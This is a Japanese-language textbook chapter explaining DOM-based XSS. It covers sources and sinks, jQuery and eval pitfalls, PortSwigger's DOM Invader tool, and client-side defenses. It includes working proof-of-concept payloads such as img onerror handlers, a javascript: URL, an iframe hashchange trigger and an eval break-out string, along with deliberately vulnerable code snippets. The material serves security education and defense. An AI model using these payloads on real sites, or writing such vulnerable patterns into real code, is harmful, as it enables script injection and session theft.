# 第3章 DOMベースXSS ― source/sink体系・クライアントサイドJS解析・postMessage

## DOMベースXSSの基礎とDOM Invader導入

反射型・格納型のXSS（Cross-Site Scripting: 攻撃者が仕込んだ文字列が、ブラウザによって「データ」ではなく「コード」として解釈・実行されてしまう脆弱性）では、悪意ある入力は**必ず一度サーバを通り、サーバが組み立てたHTMLに載って**ブラウザへ返ってきます。ところがWebアプリケーションの主戦場がサーバ側テンプレートから**クライアント側のJavaScript**へと移った結果、「サーバは一切関与していないのに、ブラウザ内でだけXSSが成立する」という第三の類型が主役級の重要度を持つようになりました。これが本章のテーマ **DOMベースXSS（DOM-based XSS）** です。

本セクションは、この分野の事実上の標準教材である PortSwigger（Burp Suite の開発元）の2つの資料——「What is DOM-based XSS?」と「Introducing DOM Invader」——を直接取得（WebFetch）した上で精読・統合し、(1) DOMベースXSSの原理と source/sink の体系、(2) 手作業での発見がなぜ困難か、(3) その困難を一変させたツール **DOM Invader** の全体像、を初学者が原文なしで完全に理解できるところまで解説します。単なる用語集ではなく、「**なぜブラウザはその代入先で入力をコードとして実行してしまうのか**」という仕組みのレベルまで掘り下げることが本セクションの価値の中心です。

---

### 1. DOMベースXSSとは何か — 反射型・格納型との根本的な違い

#### 1.1 定義

**DOMベースXSS**とは、**ページ内で動くJavaScript（クライアント側スクリプト）が、攻撃者の操作できるデータを読み取り、それを無防備な形で「危険な代入先」に渡してしまう**ことで発生するXSSです。PortSwigger の定義を直接引用すると次のとおりです。

> "DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a **source**, and passes it into a dangerous function, known as a **sink**."

ここで登場する2語が本章を貫く最重要概念です。

- **source（ソース）**: 攻撃者が値を操作できる可能性のあるデータの**入口**。JavaScript のプロパティとして現れる。代表例は `location.search`（URLのクエリ文字列 `?...` を読むプロパティ）。「データがどこから来るか」を指す。
- **sink（シンク）**: 攻撃者が制御したデータが最終的に**実行・解釈される危険な代入先**。代表例は `innerHTML`（要素のHTML内容を書き換えるプロパティ）や `eval()`（文字列をJavaScriptコードとして実行する関数）。「データがどこへ行き着くか」を指す。

DOMベースXSSは、要するに **source から sink へ、攻撃者データがそのまま流れ込む（このデータの流れを「データフロー」と呼ぶ）**現象です。

> 出典: What is DOM-based XSS (cross-site scripting)? Tutorial & Examples — https://portswigger.net/web-security/cross-site-scripting/dom-based

#### 1.2 3類型の比較 — 「サーバを通るか」「HTMLに載るか」

XSSの3類型を、**攻撃文字列がどこを経由し、どこで“コード化”するか**という軸で並べると違いが鮮明になります。

| 類型 | 攻撃文字列の経路 | HTMLへの混入場所 | サーバは関与するか |
|---|---|---|---|
| **反射型XSS** | リクエスト → サーバ → 即座にレスポンスHTMLへ反射 | サーバ側 | する（サーバが出力する） |
| **格納型XSS** | リクエスト → サーバのDB等に保存 → 後で別の応答HTMLへ出力 | サーバ側 | する（保存・出力の両方） |
| **DOMベースXSS** | 攻撃者データ → **ブラウザ内のJavaScript** → sink | **クライアント側（DOM操作時）** | **しないことがある** |

**DOM（Document Object Model: ブラウザがHTMLを解析して作る、要素のツリー構造。JavaScript はこのツリーを読み書きしてページを動かす）** という名前が示すとおり、DOMベースXSSの“事件現場”はサーバが返したHTML文字列ではなく、**ブラウザがメモリ上に組み立てたDOMツリーを、JavaScript が実行時に書き換える瞬間**です。

#### 1.3 なぜこれが厄介なのか — 「サーバに届かない攻撃」という決定的特徴

DOMベースXSS最大の特異点は、**攻撃ペイロードがそもそもサーバへ送られないケースがある**ことです。仕組みを理解すると、この分野が「素朴なXSS」と質的に異なる理由が腑に落ちます。

URLの構造を思い出してください。

```
https://example.com/page?q=検索語#fragment
                        ^^^^^^^^  ^^^^^^^^
                        クエリ文字列  フラグメント（ハッシュ）
```

このうち **`#` 以降の「フラグメント（fragment、別名ハッシュ）」は、ブラウザがサーバへHTTPリクエストを送る際に送信されません**。これはHTTPの仕様レベルの挙動で、フラグメントは「同一ページ内のどこを表示するか」を示すブラウザ内部の情報だからです。

したがって、脆弱なコードが `location.hash`（フラグメントを読むソース）から入力を取っている場合、

- 攻撃ペイロードは**サーバのアクセスログに一切残らない**（インシデント調査で見つけにくい）。
- **サーバ前段のWAF（Web Application Firewall: アプリの手前で悪意ある通信を検知・遮断する装置）が原理的に無力**になる。WAFはサーバに届くリクエストしか見られないが、ペイロードはブラウザ内で完結している。
- サーバ側の出力エスケープ（テンプレートの自動エスケープなど）をどれだけ完璧にしても、**サーバはこの脆弱性に触れてすらいない**ので何の防御にもならない。

この「防御レイヤの死角」こそ、DOMベースXSSが現代のバグバウンティや高度なペネトレーションテストで重視される理由です。防御はクライアント側コードの中でしか行えません。

> 出典: What is DOM-based XSS? — https://portswigger.net/web-security/cross-site-scripting/dom-based

---

### 2. source（ソース）— 攻撃者が制御できる入力の入口

「攻撃者が値を操作できる可能性のあるプロパティは、すべて潜在的なソース」です。PortSwigger が列挙する主要なソースを、なぜ攻撃者が制御できるのかという理由とともに整理します。

#### 2.1 URL 由来のソース（最重要）

| ソース | 何を読むか | なぜ攻撃者が制御できるか |
|---|---|---|
| `location`, `location.href` | URL全体 | 攻撃者が被害者に開かせるリンクのURLを自由に作れる |
| `location.search` | `?` 以降のクエリ文字列 | 同上。`?q=...` の値を仕込める |
| `location.hash` | `#` 以降のフラグメント | 同上。**かつサーバに届かない**（前述） |
| `location.pathname` | パス部分 | URLの一部として制御可能 |
| `document.URL` | URL全体（文字列） | `location` と同様 |
| `document.documentURI` | ドキュメントのURI | 同上 |
| `document.baseURI` | 基準URI（`<base>` の影響を受ける） | 同上 |

URL系ソースは、**「被害者に踏ませる一本のリンク」だけで攻撃が成立する**ため、実務上もっとも狙われます。

#### 2.2 URL以外のソース

| ソース | 何を読むか | なぜ攻撃者が制御できるか |
|---|---|---|
| `document.referrer` | 直前に居たページのURL | 攻撃者が用意した中継ページから遷移させれば、Referer を任意に設定できる |
| `document.cookie` | Cookie文字列 | 別経路（他の脆弱性やサブドメイン）でCookieを書ければ制御可能 |
| `window.name` | ウィンドウ/タブに付いた名前 | **タブをまたいでも残る**特殊な文字列。攻撃者ページで `window.name` を設定してから遷移させると値を運べる（クロスオリジンでも保持される点が悪用される） |
| `postMessage` の `message` イベント（`event.data`） | 別ウィンドウ/iframe から送られてきたメッセージ本文 | 攻撃者のページから `postMessage()` で任意のデータを送り込める（第7章の Web メッセージ攻撃で詳述） |
| `history.pushState` / `history.replaceState` の引数 | 履歴に積んだ状態やURL | スクリプトが履歴に書いた値を読み戻す場合に間接的に制御されうる |
| `localStorage` / `sessionStorage` | ブラウザ内の永続/セッションストレージ | 別の脆弱性やスクリプトで書き込めれば汚染源になる（HTML5-storage manipulation） |

> **重要な原則**: ソースそのものは「危険」ではありません。危険なのは、**ソースの値がサニタイズ（入力に含まれる危険な文字列を無害な形へ変換・除去する処理）されないまま sink に届く**ことです。ソースを見つけたら、その値がコード中でどこへ流れるか（＝どの sink に到達するか）を追跡するのが分析の本質です。

> 出典: What is DOM-based XSS? — https://portswigger.net/web-security/cross-site-scripting/dom-based

---

### 3. sink（シンク）— 危険な代入先と、その「発火の仕組み」

sink は「攻撃者データが渡ると望ましくない効果を引き起こす、危険なJavaScript関数やDOMオブジェクト」です。DOMベースXSSでは、sink はおおむね次の3系統に分かれます。**なぜそこで発火するのか**という仕組みが重要なので、系統ごとに原理を説明します。

#### 3.1 系統A: HTMLとして再解釈される sink（HTMLパース系）

代入した文字列を、ブラウザの **HTMLパーサ（HTML構文解析器: 文字列を読んでDOMツリーへ変換する部品）が「新しいHTML」として解釈し直す** sink です。ここが最頻出です。PortSwigger が挙げる代表的な実行系sinkは次のとおりです。

| sink | 挙動 |
|---|---|
| `document.write()` / `document.writeln()` | ドキュメントストリームへ文字列を書き出し、HTMLとして解析させる |
| `element.innerHTML` | 要素の中身を、渡された文字列を**HTMLとして解析**して置き換える |
| `element.outerHTML` | 要素自身を含めてHTMLとして置き換える |
| `element.insertAdjacentHTML()` | 指定位置に文字列をHTMLとして挿入する |
| `document.domain` | ドキュメントのドメインを変更する（同一オリジンポリシーの境界に関わる） |
| `element.onevent` | イベントハンドラ属性・プロパティへの代入（文字列がコードとして扱われる経路がある） |

**発火の仕組み（最重要）**: `innerHTML = '<b>x</b>'` のように文字列を代入すると、ブラウザはその文字列を単なるテキストではなく**HTMLソースコードとして読み直し**、`<b>` を要素ノードに変換してDOMツリーへ組み込みます。この「文字列 → DOM要素」の再解釈の過程で、攻撃者が仕込んだイベントハンドラ属性（`onerror` など）や危険なタグが**正規のHTML要素として生成され、ブラウザのイベント機構に登録される**ため、コードとして動き出すのです。

> **落とし穴（試験に出る仕組み）**: `innerHTML` に `<script>alert(1)</script>` を入れても**スクリプトは実行されません**。これはHTML仕様で「パーサ挿入以外の経路で後から挿入された `<script>` 要素は実行しない」と定められているためです。だからこそ攻撃者は `<script>` を使わず、**`<img src=1 onerror=alert(document.domain)>` のように「読み込み失敗イベントで発火するタグ」**を使います。存在しない画像 `src=1` の読み込みは必ず失敗し、`onerror` ハンドラが呼ばれる——この「必ず失敗する」性質を逆手に取るのが定石です。実際にPortSwigger が示す典型的な脆弱コードと攻撃はこうなります。

```javascript
// 脆弱なコード
document.write('... <script>alert(document.domain)</script> ...');
```

```html
<!-- innerHTML経由での等価な攻撃 -->
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

#### 3.2 系統B: 文字列をコードとして実行する sink（JavaScript実行系）

渡された文字列を、そのまま**JavaScriptソースコードとして評価・実行**してしまう sink です。HTMLパースを経由しないぶん、より直接的です。

| sink | 挙動 |
|---|---|
| `eval()` | 引数の文字列をJavaScriptとして実行 |
| `Function()`（`new Function(...)`） | 文字列から関数を生成して実行可能にする |
| `setTimeout()` / `setInterval()` | **第1引数が文字列だと**、それをコードとして評価して実行する |

**発火の仕組み**: `eval("alert(1)")` は、JavaScriptエンジンが引数の文字列を新しいソースコードとしてコンパイルし、その場のスコープで走らせます。`setTimeout("alert(1)", 100)` のように**関数ではなく文字列を渡すと、内部的に `eval` 相当の評価が起きる**点が盲点です（関数を渡せば安全）。

#### 3.3 系統C: ナビゲーション/URL系 sink（`javascript:` スキーム）

`location` / `location.href` / `location.assign()` / `location.replace()`、あるいは `a.href` や `iframe.src` などのURL属性は、遷移先URLとして解釈されます。ブラウザは `javascript:` で始まるURLへの遷移を「そのコードを実行せよ」という命令として扱うため、攻撃者が遷移先URLを制御できれば、`javascript:` スキームでコード実行に持ち込めます。

具体例として、PortSwigger が示す実例を見てみましょう。

```javascript
$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnUrl'));
```

このコードは、URLパラメータ `returnUrl` の値をそのまま `<a>` タグの `href` 属性に設定しています。攻撃者が次のようなURLを踏ませれば、

```
?returnUrl=javascript:alert(document.domain)
```

被害者が「戻る」リンクをクリックした瞬間に `javascript:` スキームが実行されます。**なぜ動くのか**: `href` 属性は本来「移動先URL」を保持するだけですが、ブラウザは `javascript:` プレフィックスを特別扱いし、リンククリック時にプレフィックス以降をコードとしてそのまま実行する、というブラウザの仕様そのものが悪用されています。

#### 3.4 系統D: jQuery など JavaScript ライブラリの sink

ライブラリの便利関数が、内部で `innerHTML` 相当の処理を呼ぶために sink になります。PortSwigger が挙げる jQuery の代表的な sink 一覧は次のとおりです。

```
add(), after(), append(), animate(), insertAfter(), insertBefore(),
before(), html(), prepend(), replaceAll(), replaceWith(), wrap(),
wrapInner(), wrapAll(), has(), constructor(), init(), index(),
jQuery.parseHTML(), $.parseHTML()
```

**jQuery `$()` の危険な仕組み（頻出）**: `$(x)` は通常「CSSセレクタで要素を探す」関数ですが、jQuery は**引数の文字列が `<` で始まると「これはHTMLだ」と判断してその場でHTML要素を生成**します。PortSwigger が挙げる典型パターンはこうです。

```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

このコードでは、URLフラグメント（`location.hash`）の値がそのまま `$()` へ渡されています。フラグメントが `#<img src=1 onerror=alert(1)>` のように `<` を含む文字列であれば、jQuery はセレクタ検索のつもりが**新しい要素の生成＝コード実行**に化けます。ただし通常は被害者にリンクをクリックさせる（＝`hashchange` を発火させる）操作が必要になるため、PortSwigger は次のように**iframeを使って被害者の操作なしに `hashchange` を起こす**実戦的な悪用例も示しています。

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'"></iframe>
```

**なぜ動くのか**: iframeを空のフラグメント（`#`）付きでまず読み込み、`onload` イベントでフラグメントに攻撃文字列を追記する。フラグメントの変更は `hashchange` イベントを発火させるため、脆弱なハンドラが**被害者の一切の操作なしに**起動し、`$(location.hash)` がペイロードをHTML化します。

> **バージョン依存の注意（陳腐化への警戒）**: この種の `$()` 悪用は、jQuery のバージョンによって成立条件が変わります。**jQuery 1.9.0（2013年公開）より前**は `$()` が `#` を含む文字列でもHTMLとして扱いやすく、より緩い条件で発火しました。それ以降のバージョンでは、入力が `#` で始まる場合にHTML注入を防ぐよう挙動が厳格化されています。現場で古いjQueryを見たら、この差を必ず意識してください。

> 出典: What is DOM-based XSS (cross-site scripting)? Tutorial & Examples — https://portswigger.net/web-security/cross-site-scripting/dom-based

---

### 4. 具体的なコード例・ペイロード例（原理つき）

ここまでの source/sink を、追加の代表例で具体化します。各例に「**なぜ動くのか**」を必ず添えます。

#### 4.1 `innerHTML` sink（最も基本的なDOM XSS）

脆弱なコード:

```javascript
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

このコードは検索語をそのまま `innerHTML` に連結しています。値が URL の `location.search` などから来ていて攻撃者が制御できるなら、次のような値を注入します。

```html
You searched for: <img src=1 onerror='alert(document.cookie)'>
```

**なぜ動くのか**: `innerHTML` への代入時にブラウザのHTMLパーサが文字列を再解釈し、`<img>` を実要素として生成する。`src=1` は必ず読み込みに失敗するため `onerror` イベントが確実に発火し、そこに書いた任意のJavaScript（ここでは Cookie を盗む `alert(document.cookie)`）が実行される。`<script>` ではなく `<img onerror>` を使うのは、§3.1 で述べたとおり `innerHTML` 経由の `<script>` はブラウザが実行しない仕様だから。

#### 4.2 `document.write()` sink

脆弱なコード（検索クエリをページに書き戻す典型例）:

```javascript
document.write('<p>検索結果: ' + location.search.slice(3) + '</p>');
```

URLを `?q=<img src=1 onerror=alert(1)>` のようにして誘導すると、`document.write` が組み立てたHTML文字列がそのままパースされ、`onerror` が発火します。

**なぜ動くのか**: `document.write()` は引数をドキュメントストリームへ流し込み、HTMLパーサに解析させる。ソース `location.search` の値が無検証で連結されているため、攻撃者のタグがそのままDOM化して実行される。`document.write` が `<select>` 要素の内側など「特定の親要素の中」で使われている場合は、まず `</select>` などで文脈（コンテキスト）を抜けてからペイロードを置く、という**コンテキスト脱出**が必要になることもあります。

#### 4.3 `eval()` 周辺の例

脆弱なコード（クエリからJSONを読もうとして `eval` を使ってしまう悪例）:

```javascript
var data = eval('(' + location.search.slice(3) + ')');
```

`?x={});alert(1);({` のような入力で、`eval` がコードとして評価し `alert(1)` が走ります。

**なぜ動くのか**: `eval` は引数文字列を無条件にJavaScriptとしてコンパイル・実行する。攻撃者は JSON のふりをした文字列の中に文をねじ込み、括弧のバランスを調整してコードを紛れ込ませる。正しくは `JSON.parse()`（データとしてのみ解釈し、コードは実行しない）を使うべきで、`eval` を JSON パースに使うこと自体がアンチパターン。

---

### 5. どうやって見つけるか — 手作業の限界と、ツールが必要な理由

#### 5.1 手作業のアプローチ

原理的には、DOM XSS の探索は次の手順です。

1. ページで動く**全JavaScriptを読み、各ソース（`location` 等）が参照されている箇所を洗い出す**。
2. そのソースの値が代入・連結・関数呼び出しを経て**どこへ流れるか（データフロー）を追跡**する。
3. 途中でサニタイズされずに**危険な sink に到達していれば脆弱**。
4. sink に届く形に合わせてペイロードを組み立て、コンテキスト脱出などを施して発火させる。

PortSwigger 自身、DOM XSS の検出方法として、Burp の Web脆弱性スキャナによる自動検出に加え、**ブラウザ開発者ツール上での検索**（DOM内の注入文字列を `Ctrl+F`/`Cmd+F` で探す、JavaScriptコードを `Ctrl+Shift+F`/`Cmd+Alt+F` で横断検索する）という手作業の手段を挙げています。

#### 5.2 なぜ DOM XSS は難しいのか

- **コードが人間可読でない**。本番のJavaScriptは**ミニファイ（minify: 空白・改行・意味のある変数名を削って圧縮した状態）**され、しばしば**難読化**されている。ソースからsinkへの流れが**数千行**に散らばり、変数名も `a`, `b`, `c` のように潰れている。
- **フレームワークが sink を隠す**。jQuery や各種SPA（Single Page Application）フレームワークの内部で `innerHTML` 相当が呼ばれるため、表面のコードを見ても sink が見えない。
- **サーバに痕跡が残らない**（§1.3）。したがってプロキシでリクエスト/レスポンスを眺める従来型の手法だけでは、ブラウザ内で完結するフローを捉えきれない。

結果として、DOM XSS の手作業探索は「複雑なJavaScriptの中で入力の流れを延々と手で追う、退屈で骨の折れる作業」になります。実際、PortSwigger のブログ記事「Introducing DOM Invader」は、現代のサイトが「複数のJavaScriptライブラリを使い、大量の複雑で難読化されたコードを持つ（multiple JavaScript libraries, and have many lines of complex, minified code）」ため、手動テストが極めて困難であると述べています。**この作業を、あたかも反射型XSSを探すかのように簡単にする**ために作られたのが DOM Invader です。

> 出典: What is DOM-based XSS? — https://portswigger.net/web-security/cross-site-scripting/dom-based
> 出典: Introducing DOM Invader: DOM XSS just got a whole lot easier to find — https://portswigger.net/blog/introducing-dom-invader

---

### 6. DOM Invader 導入 — DOM XSS 探索を一変させたツール

#### 6.1 DOM Invader とは何か・登場の背景

**DOM Invader** は、PortSwigger が **2021年6月30日** に発表した、Burp Suite 向けの新ツールです。ブログ記事のタイトルそのものが主張になっています——「**DOM XSS just got a whole lot easier to find（DOM XSS の発見が一気に簡単になった）**」。開発は **Gareth Heyes** を中心に、PortSwigger のスキャナ開発チーム（James Kettle、Patrick Albinson、Alex、Paul Wilshaw ほか）が携わりました。同チームは公開前に DOM Invader を実戦投入し、**PayPal の DOM XSS 脆弱性**を実際に発見したことをブログで紹介しています。

背景にあるのは §5.2 で見た「DOM XSS は手作業では非常に見つけにくい」という長年の問題です。従来もブラウザの開発者ツール（DevTools）でブレークポイントを張って追う、あるいは古い専用ツールを使う、といった方法はありましたが、いずれも熟練と根気を要しました。DOM Invader はこの探索を、**Burp に組み込まれたブラウザ（Burp's embedded browser: Chromium ベースの内蔵ブラウザ）に載る拡張機能**として実装し、「ターゲットのDOMを計装（instrument）し、遭遇するJavaScriptのソースとシンクを片っ端から傍受する（instruments your target's DOM, intercepting any JavaScript sources and sinks it might come across）」ことで、探索の大部分を自動化・可視化します。ソースは `location.search` や `document.URL`、`window.name` のようにユーザー入力を受け取るJavaScriptオブジェクト、シンクは `eval`、`innerHTML`、`setTimeout` のようにコード実行を可能にする関数、という位置づけです。

**重要な特徴**: DOM Invader は **2021.7 リリース（Early Adopter チャンネル）**で登場し、**Burp Suite Professional（有償版）だけでなく Community Edition（無償版）でも利用できる**、内蔵ブラウザの標準機能です。高価なライセンスがなくても DOM XSS の体系的探索ができる、という点が学習者にとって大きな意味を持ちます。利用するには、**Burp の内蔵ブラウザ右上のアイコンをクリックして有効化**します。

> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader
> 出典: DOM Invader（Burp ドキュメント） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader

#### 6.2 中核機能1: canary（カナリア）

**canary（カナリア）** とは、**ユーザー入力が sink まで届いているかを追跡するための、目印になるユニークな文字列（"a unique string that's used to see where your user input is reflected inside a sink"）**です（炭鉱のカナリア＝危険の察知役、が語源）。

使い方の原理はこうです。テスターは canary（既定ではランダム生成される文字列だが、任意の値に変更もできる）を、テストしたいソース——URLのクエリパラメータやフラグメントなど——に入れます。DOM Invader は**この canary がページ内でどの sink に到達したかを検出**し、DevTools 上で該当箇所を**自動的にハイライト**して教えてくれます。

**なぜ有効か**: 反射型XSSでは「入力した目印文字列がレスポンスHTMLのどこに出るか」を見て反射点を探します。canary はこの発想を DOM の世界へ持ち込むもので、**数千行のJSを手で追う代わりに、目印が sink に着いたかどうかを機械に判定させる**ことができます。

> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader

#### 6.3 中核機能2: Augmented DOM（拡張DOM）

**Augmented DOM（拡張DOM）** は、Burp 内蔵ブラウザの DevTools に追加される専用タブで、**そのページに存在する source と sink をツリー状に一覧表示**します。DOM Invader が検出できる source と sink の一覧は非常に網羅的で、それぞれに**重要度に基づく数値ランク**（1に近いほど優先度が高い）が付与されています。ブログでは「**最も興味深いものが最初に表示される（the most interesting ones appearing first）**」と説明されており、たとえば `eval` はランク2、`innerHTML` はランク21、`location` 関連の sink は20番台といった具合に、危険度の高いものから並びます（ランクの総数はドキュメント時点でおよそ80台に及びます）。

PortSwigger 自身がこの機能の意義を次のように表現しています。

> Augmented DOM を使えば、**DOM XSS をあたかも反射型XSSであるかのように見つけられる**。

**なぜ画期的か**: 従来は「JavaScript を読んで source→sink のデータフローを頭の中で再構築する」必要がありました。Augmented DOM は**そのデータフローの結果（どのソースがどの sink に届いているか）をツリーとして直接提示**するため、コード読解というボトルネックを丸ごと省けます。各 sink アクセスをクリックすると、それが**どこから呼ばれたか（スタックトレース: 関数呼び出しの経路）**を DevTools コンソールで確認でき、脆弱箇所の特定が容易になります。

> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader

#### 6.4 中核機能3: Web メッセージ（postMessage）のテスト

DOM Invader は、専用の **Postmessage タブ**で、ページ上で `postMessage()` により送受信される **Web メッセージ**を**傍受・改変**できます。特に注目すべき機能として、「**'Spoof origin' チェックボックスをクリックするだけで、Web メッセージの送信元（origin）を偽装できる（you can spoof the origin of a web message, simply by clicking the 'Spoof origin' check box）**」ことが挙げられます。これにより、Web メッセージの送信元検証が不十分な実装（送信元を確認せず `event.data` を信頼してしまうコード）を素早く突くことができ、**Web メッセージ由来の DOM XSS**（送られてきた `event.data` が sink に流れるパターン。第7章で詳述）を効率的に検証できます。DOM Invader はまた、検出結果から**PoC（Proof of Concept: 脆弱性の実証コード）を自動生成**する機能も持ちます。

> 出典: Introducing DOM Invader — https://portswigger.net/blog/introducing-dom-invader

#### 6.5 実際の使い方（基本フロー）

1. Burp を起動し、**内蔵ブラウザ**を開く。ブラウザ右上のアイコンをクリックして DOM Invader を有効化する。
2. canary を設定する（既定のランダム値でよい。任意の文字列に変更も可）。
3. テスト対象サイトを開き、**canary を URL のクエリやフラグメント等のソースに差し込む**。
4. DevTools の **Augmented DOM タブ**を開き、canary が到達した source/sink を確認する。ランク順に表示されるため、危険な sink（`eval`, `innerHTML` 等）に届いていれば有望。
5. sink アクセスのスタックトレースで、脆弱なコード箇所を特定する。
6. Web メッセージが絡む場合は Postmessage タブでメッセージを観察し、必要なら「Spoof origin」で送信元検証をすり抜けてテストする。
7. その sink の性質に合わせてペイロードを組み立て、発火を確認する。

#### 6.6 その後の進化（バージョン注記 — 陳腐化への注意）

2021年の初版ブログが扱った中核は **canary / Augmented DOM / Web メッセージ**の3本柱でした。その後 DOM Invader は継続的に強化され、**プロトタイプ汚染（prototype pollution: JavaScript のオブジェクトの“親テンプレート”を汚染して挙動を乗っ取る攻撃。第4章で詳述）の自動検出**などの機能が加わっています。本セクションの主眼である「登場背景と基礎機能」は初版ブログに基づきますが、**実際にツールを使う際は必ず最新版のドキュメントで現行機能を確認**してください（ツールは頻繁に更新されます）。DOM Invader の詳細なオプション設定・Web メッセージテストの手順は、PortSwigger の公式ドキュメント `https://portswigger.net/burp/documentation/desktop/tools/dom-invader` に継続的に反映されています。

> 出典: DOM Invader（Burp ドキュメント、最新機能一覧） — https://portswigger.net/burp/documentation/desktop/tools/dom-invader

---

### 7. DOMベースXSS以外の「DOM系脆弱性」全体像

PortSwigger は、DOM XSS を「攻撃者データが source → sink へ流れて悪影響を及ぼす」という同じ枠組みで捉えられる**DOM系脆弱性ファミリー**の一員として位置づけています。sink が変われば影響も変わる、という発想です。学習者はこの地図を押さえておくと、実務で「XSSにはならないが別の被害が出る」ケースを見逃さずに済みます。

| 脆弱性の種類 | 典型的な sink | 何が起きるか（影響） |
|---|---|---|
| **DOM-based XSS** | `innerHTML`, `eval`, `document.write`, jQuery `html()` 等 | 任意のJavaScript実行 |
| **DOM-based open redirection**（オープンリダイレクト） | `location`, `location.href`, `location.assign()`, `location.replace()` | 攻撃者サイトへ強制遷移（フィッシング等） |
| **DOM-based cookie manipulation**（Cookie操作） | `document.cookie` | Cookie を攻撃者値で上書き。セッション固定や他攻撃の足場 |
| **DOM-based JavaScript injection** | `eval`, `Function`, `setTimeout`（文字列）等 | コード実行（XSSと重なる） |
| **DOM-based document-domain manipulation** | `document.domain` | 同一オリジンポリシーの境界を緩めさせられる |
| **DOM-based link manipulation**（リンク操作） | `a.href`, `element.src` 等 | 正規リンクを差し替え |
| **DOM-based web-message manipulation** | `postMessage()` の宛先 | 別ウィンドウへ悪意あるメッセージ送信 |
| **DOM-based HTML5-storage manipulation** | `localStorage.setItem()`, `sessionStorage.setItem()` | ストレージ汚染（後続のDOM XSSの source になりうる） |

このファミリー観の実務的な含意は明快です。**「その sink はコード実行に至るか？」を毎回問う**こと。至るなら XSS、至らないなら別カテゴリの被害を評価する、という切り分けができるようになります。

---

### 8. 防御 — クライアント側でしか守れない

DOM XSS の防御は、§1.3 で述べたとおり**サーバ側では完結できません**（サーバに届かない攻撃があるため）。防御はJavaScriptコードの内側で行う必要があります。PortSwigger は「**信頼できないソースから来たデータを、動的にHTMLドキュメントへ書き込むことを避ける（avoid allowing data from any untrusted source to be dynamically written to the HTML document）**」ことを基本原則として掲げています。この原則と実務のベストプラクティスをまとめます。

1. **そもそも危険な sink に、攻撃者制御データを渡さない**。これが最上位の原則。動的にHTMLを組み立てる必要が本当にあるかを問い直す。
2. **安全な代替 sink を使う**。テキストを表示したいだけなら `innerHTML` ではなく **`textContent`**（渡した文字列を必ずプレーンテキストとして扱い、HTMLとして解釈しない）を使う。これだけで大多数の innerHTML 由来 DOM XSS は消える。
3. **どうしてもHTMLを動的生成するなら、コンテキストに応じたエスケープ／サニタイズを施す**。HTML文脈・属性文脈・JavaScript文脈・URL文脈で必要な処理は異なる（詳細は第2章のコンテキスト別対策を参照）。**HTML用のサニタイズとJavaScript用のサニタイズは別物**であり、PortSwigger も「HTML sink とJavaScript実行 sink を区別して対策を実装すべき」と述べています。
4. **信頼できるサニタイズライブラリを使う（自作しない）**。事実上の標準は **DOMPurify** で、HTMLをパースして危険な要素・属性を除去する。
   > **バージョン依存の注意（重要）**: DOMPurify は繰り返しバイパス（回避手法）が発見され、その都度修正されてきた。例えば **DOMPurify 2.0.17（2020年公開）より前**のバージョンには既知のバイパスが存在し、古いバージョンをそのまま使い続けると防御が破られる。特に **mXSS（mutation XSS: ブラウザがDOMを再シリアライズ／再パースする際にHTMLが“変異”して、サニタイズ後に危険な形へ化ける現象。名前空間の切り替え〔HTML/SVG/MathML〕を悪用するものが有名）** による名前空間混同バイパスは近年も複数報告されている。**DOMPurify は必ず最新版に追従し、更新を怠らないこと**。（mXSS の仕組みは第4章で詳述。）
5. **Trusted Types を導入する**。**Trusted Types** は、`innerHTML` などの危険な sink へ渡せる値を「検証済みの特別な型（TrustedHTML など）」に限定するブラウザ機構で、CSP（Content Security Policy）ヘッダ `require-trusted-types-for 'script'` で有効化する。**生の文字列を sink に渡すこと自体をブラウザレベルで禁止**できるため、DOM XSS を構造的に封じる強力な多層防御になる（対応ブラウザは Chromium 系が中心）。
6. **`eval` / `Function` / 文字列引数の `setTimeout` を使わない**。JSONは必ず `JSON.parse()` で扱う。

> 出典: What is DOM-based XSS?（防御セクション） — https://portswigger.net/web-security/cross-site-scripting/dom-based

---

### 9. 本セクションのまとめ

- **DOMベースXSS**は、サーバではなく**ブラウザ内のJavaScript**が、攻撃者制御データ（**source**）を危険な代入先（**sink**）へ無検証で渡すことで起きる。`location.hash` を使う型は**サーバに届かず**、WAFやサーバ側エスケープが原理的に無力になる点が決定的な特徴。
- **source** はURL系（`location.*`, `document.URL`）を筆頭に、`document.referrer`, `window.name`, `postMessage`, ストレージなど多岐にわたる。**sink** はHTMLパース系（`innerHTML`, `document.write`）、コード実行系（`eval`, 文字列 `setTimeout`）、URL系（`javascript:`）、ライブラリ系（jQuery `$()`, `.html()`）に大別できる。
- 発火の核心は**ブラウザによる再解釈**——文字列をHTMLパーサがDOM要素に変換する（`onerror` 発火）、あるいはJSエンジンがソースとしてコンパイルする——という仕組みにある。`innerHTML` 経由の `<script>` が動かない一方 `<img onerror>` が動く理由も、この仕組みから導ける。
- DOM XSS は3類型の中でも発見が難しい。ミニファイ／難読化された数千行のJSでデータフローを手追いする作業を、**DOM Invader**（2021年6月30日、Gareth Heyes らが開発。Burp 内蔵ブラウザの拡張。Community 版でも利用可）が **canary・Augmented DOM・Web メッセージ（Spoof origin機能付き）**で「反射型XSSのように」簡単にした。
- 防御はクライアント側でしか完結しない。`textContent` への置き換え、DOMPurify（**最新版必須**）、Trusted Types が主力。`eval` 系は排除する。

次セクション以降では、ここで俯瞰した DOM 系脆弱性の各論——DOM Invader のより詳細な設定・Web メッセージ、プロトタイプ汚染、mXSS——を、それぞれの発火メカニズムまで掘り下げて扱います。

---

## DOM Invader実践（Burp公式ドキュメント）

このセクションでは、PortSwigger（Burp Suite の開発元）が提供するブラウザ内蔵ツール **DOM Invader（ドム・インベーダー）** を使って、DOM ベース XSS（クロスサイトスクリプティング）を体系的に発見・検証する方法を、公式ドキュメントに沿って詳しく解説する。DOM ベース XSS の理論（source と sink、データフロー）は本章の前節までで扱った前提知識とし、ここでは「実際にどう見つけるか」という実務に踏み込む。

> ℹ️ **本セクションの資料取得についての注記**
